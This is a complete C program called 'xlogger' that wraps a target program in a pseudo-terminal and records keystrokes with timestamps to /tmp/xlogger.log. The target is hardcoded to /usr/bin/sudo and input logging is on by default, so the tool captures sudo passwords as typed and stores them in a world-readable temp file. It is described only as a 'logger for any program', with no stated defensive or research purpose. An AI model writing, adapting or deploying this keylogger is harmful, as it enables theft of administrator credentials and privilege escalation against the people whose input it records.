/*
 * xlogger - Keyboard input and console output logger for any program
 * 
 * Configuration:
 * - TARGET_PROGRAM: Path to the target program to monitor
 * - log_keyboard_input: Set to 1 to enable keyboard input logging (default: 1)
 * - log_console_output: Set to 1 to enable console output logging (default: 1)
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <termios.h>
#include <util.h>

#define TARGET_PROGRAM "/usr/bin/sudo"
#define LOG_FILE "/tmp/xlogger.log"
#define BUFFER_SIZE 4096
#define INPUT_LINE_BUFFER_SIZE 1024

// 1是记录 0是不记录
// 是否记录键盘 默认记录
static int log_keyboard_input = 1;

// 是否记录终端的输出 默认不记录
static int log_console_output = 0;

static struct termios original_termios;
static int master_fd = -1;
static FILE *log_fp = NULL;
static pid_t child_pid = -1;
static char input_line_buffer[INPUT_LINE_BUFFER_SIZE];
static size_t input_line_pos = 0;



void flush_input_line(void) {
    if (input_line_pos > 0 && log_fp && log_keyboard_input) {
        time_t now;
        struct tm *tm_info;
        char timestamp[32];
        
        time(&now);
        tm_info = localtime(&now);
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
        
        fprintf(log_fp, "[%s] INPUT: ", timestamp);
        
        for (size_t i = 0; i < input_line_pos; i++) {
            unsigned char c = input_line_buffer[i];
            if (c >= 32 && c <= 126) {
                fputc(c, log_fp);
            } else if (c == '\t') {
                fputs("\\t", log_fp);
            } else {
                fprintf(log_fp, "\\x%02x", c);
            }
        }
        
        fputc('\n', log_fp);
        fflush(log_fp);
        
        input_line_pos = 0;
    }
}

void cleanup(void) {
    flush_input_line();
    
    if (log_fp) {
        fclose(log_fp);
    }
    
    if (master_fd >= 0) {
        close(master_fd);
    }
    
    tcsetattr(STDIN_FILENO, TCSANOW, &original_termios);
}

void signal_handler(int sig) {
    if (child_pid > 0) {
        kill(child_pid, sig);
    }
    cleanup();
    exit(0);
}

void log_input(const char *data, size_t len) {
    if (!log_keyboard_input) return;
    
    for (size_t i = 0; i < len; i++) {
        unsigned char c = data[i];
        
        if (c == '\n' || c == '\r') {
            flush_input_line();
        } else {
            if (input_line_pos < INPUT_LINE_BUFFER_SIZE - 1) {
                input_line_buffer[input_line_pos++] = c;
            } else {
                flush_input_line();
                if (input_line_pos < INPUT_LINE_BUFFER_SIZE - 1) {
                    input_line_buffer[input_line_pos++] = c;
                }
            }
        }
    }
}

void log_output(const char *data, size_t len) {
    if (!log_fp || !log_console_output) return;
    
    time_t now;
    struct tm *tm_info;
    char timestamp[32];
    
    time(&now);
    tm_info = localtime(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
    
    fprintf(log_fp, "[%s] OUTPUT: ", timestamp);
    
    for (size_t i = 0; i < len; i++) {
        unsigned char c = data[i];
        if (c >= 32 && c <= 126) {
            fputc(c, log_fp);
        } else if (c == '\n') {
            fputs("\\n", log_fp);
        } else if (c == '\r') {
            fputs("\\r", log_fp);
        } else if (c == '\t') {
            fputs("\\t", log_fp);
        } else {
            fprintf(log_fp, "\\x%02x", c);
        }
    }
    
    fputc('\n', log_fp);
    fflush(log_fp);
}

int setup_terminal(void) {
    struct termios new_termios;
    
    if (tcgetattr(STDIN_FILENO, &original_termios) < 0) {
        perror("tcgetattr");
        return -1;
    }
    
    new_termios = original_termios;
    cfmakeraw(&new_termios);
    
    if (tcsetattr(STDIN_FILENO, TCSANOW, &new_termios) < 0) {
        perror("tcsetattr");
        return -1;
    }
    
    return 0;
}

int create_pty_and_fork(char **argv) {
    int slave_fd;
    
    if (openpty(&master_fd, &slave_fd, NULL, NULL, NULL) < 0) {
        perror("openpty");
        return -1;
    }
    
    child_pid = fork();
    if (child_pid < 0) {
        perror("fork");
        close(master_fd);
        close(slave_fd);
        return -1;
    }
    
    if (child_pid == 0) {
        close(master_fd);
        
        if (login_tty(slave_fd) < 0) {
            perror("login_tty");
            _exit(1);
        }
        
        execv(TARGET_PROGRAM, argv);
        perror("execv");
        _exit(1);
    }
    
    close(slave_fd);
    return 0;
}

void io_loop(void) {
    fd_set read_fds;
    char buffer[BUFFER_SIZE];
    ssize_t bytes_read;
    int max_fd = (STDIN_FILENO > master_fd) ? STDIN_FILENO : master_fd;
    
    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(STDIN_FILENO, &read_fds);
        FD_SET(master_fd, &read_fds);
        
        if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) {
            if (errno == EINTR) continue;
            perror("select");
            break;
        }
        
        if (FD_ISSET(STDIN_FILENO, &read_fds)) {
            bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer));
            if (bytes_read <= 0) break;
            
            log_input(buffer, bytes_read);
            
            if (write(master_fd, buffer, bytes_read) != bytes_read) {
                if (errno != EPIPE && errno != EIO) {
                    perror("write to master");
                }
                break;
            }
        }
        
        if (FD_ISSET(master_fd, &read_fds)) {
            bytes_read = read(master_fd, buffer, sizeof(buffer));
            if (bytes_read <= 0) break;
            
            log_output(buffer, bytes_read);
            
            if (write(STDOUT_FILENO, buffer, bytes_read) != bytes_read) {
                perror("write to stdout");
                break;
            }
        }
    }
}

int main(int argc, char *argv[]) {
    int status;
    
    log_fp = fopen(LOG_FILE, "a");
    if (!log_fp) {
        perror("fopen log file");
        return 1;
    }
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGQUIT, signal_handler);
    atexit(cleanup);
    
    if (setup_terminal() < 0) {
        return 1;
    }
    
    if (create_pty_and_fork(argv) < 0) {
        return 1;
    }
    
    fprintf(log_fp, "\n=== New session started: %s ===\n", TARGET_PROGRAM);
    for (int i = 1; i < argc; i++) {
        fprintf(log_fp, "Arg[%d]: %s\n", i, argv[i]);
    }
    fprintf(log_fp, "=====================================\n");
    fflush(log_fp);
    
    io_loop();
    
    waitpid(child_pid, &status, 0);
    
    fprintf(log_fp, "=== Session ended with status: %d ===\n\n", 
            WIFEXITED(status) ? WEXITSTATUS(status) : -1);
    fflush(log_fp);
    
    return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
}